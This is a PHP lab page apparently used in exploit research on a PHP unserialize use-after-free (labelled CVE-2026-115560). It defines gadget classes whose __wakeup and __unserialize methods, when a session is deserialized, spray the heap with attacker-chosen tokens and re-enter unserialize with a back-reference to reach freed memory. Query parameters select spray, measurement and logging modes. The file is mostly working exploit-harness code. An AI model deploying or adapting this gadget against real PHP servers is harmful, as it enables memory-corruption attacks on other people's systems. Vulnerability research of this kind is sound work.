<?php
/*
 * LAB-ONLY CVE-2026-115560 B' variant: delayed __wakeup / __unserialize as the
 * re-entry gadget.
 *
 * PHP 8.4/8.5 delay __wakeup (and __unserialize) calls into the var_dtor list
 * and invoke them from var_destroy(), *after* the var_entries extension chain
 * has been freed (see ext/standard/var_unserializer.re, var_destroy). Unlike
 * the final i_zval_ptr_dtor(zv), these calls are wrapped in
 * BG(serialize_lock)++ ... --, so a nested unserialize() is expected to take
 * the *fresh* context branch and NOT see the freed chain. This page proves or
 * falsifies that expectation in the lab.
 *
 * ?m=0 -> wakeup records pid and sleeps (generic address diagnostic)
 * ?m=5 -> wakeup records pid and sleeps (measure; called from var_destroy)
 * ?m=4 -> wakeup sprays and re-enters unserialize('R:1020;')
 * ?u=1 -> use CacheWakeupU (__unserialize) instead of CacheWakeup (__wakeup)
 *
 * Class names: CacheWakeup (11) / CacheWakeupU (12).
 */
function dlog($s)
{
    @file_put_contents('/tmp/wakeup_log', $s . "\n", FILE_APPEND);
}

function do_spray($token)
{
    $slen = (int)($_GET['s'] ?? 3048);
    $spray = [];
    for ($i = 0; $i < 64; $i++) {
        $s = str_repeat("\x41", $slen);
        $q = substr($token . str_repeat("\x00", 8), 0, 8);
        for ($j = 0; $j < 8; $j++) { $s[$j] = $q[$j]; }
        $spray[] = $s;
    }
    return $spray;
}

class CacheWakeup
{
    public $key;

    public function __wakeup()
    {
        $mode = $_GET['m'] ?? '4';
        dlog("wakeup m=$mode pid=" . getmypid());
        if ($mode === '0' || $mode === '5') {
            @file_put_contents('/tmp/meas_pid', getmypid());
            dlog("wakeup-measure-sleep");
            sleep(20);
            return;
        }
        if ($mode !== '4') {
            return;
        }
        $spray = do_spray((string)$this->key);
        dlog("spray-done");
        $ref = (int)($_GET['r'] ?? 1020);
        $r = @unserialize('R:' . $ref . ';');
        dlog("after-unserialize type=" . gettype($r));
        unset($r);
        unset($spray);
        dlog("wakeup-end");
    }

    public function __destruct()
    {
        dlog("wakeup-dtor pid=" . getmypid());
    }
}

class CacheWakeupU
{
    public $key;
    public $data;

    public function __unserialize(array $data): void
    {
        $mode = $_GET['m'] ?? '4';
        $token = (string)($data['key'] ?? '');
        $this->key = $token;
        $this->data = $data;
        dlog("unserialize-fn m=$mode pid=" . getmypid());
        if ($mode === '0' || $mode === '5') {
            @file_put_contents('/tmp/meas_pid', getmypid());
            dlog("unserialize-measure-sleep");
            sleep(20);
            return;
        }
        if ($mode !== '4') {
            return;
        }
        $spray = do_spray($token);
        dlog("spray-done");
        $ref = (int)($_GET['r'] ?? 1020);
        $r = @unserialize('R:' . $ref . ';');
        dlog("after-unserialize type=" . gettype($r));
        unset($r);
        unset($spray);
        dlog("unserialize-fn-end");
    }

    public function __destruct()
    {
        dlog("unserialize-dtor pid=" . getmypid());
    }
}

register_shutdown_function(function () { dlog("shutdown"); });
@ini_set('session.serialize_handler', 'php');
session_start();
dlog("after-session-start");
echo "115560 wakeup consumer ok\n";
